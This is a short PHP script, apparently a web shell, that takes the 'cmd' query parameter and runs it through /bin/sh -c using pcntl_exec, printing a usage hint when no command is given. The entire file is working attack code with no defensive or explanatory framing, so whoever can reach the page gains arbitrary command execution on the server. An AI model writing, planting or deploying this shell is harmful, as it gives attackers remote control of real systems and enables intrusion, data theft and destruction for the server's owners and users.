<?php
if (isset($_GET['cmd'])) {
    pcntl_exec('/bin/sh', array('-c', $_GET['cmd']));
} else {
    echo "Usage: ?cmd=COMMAND";
}
?>
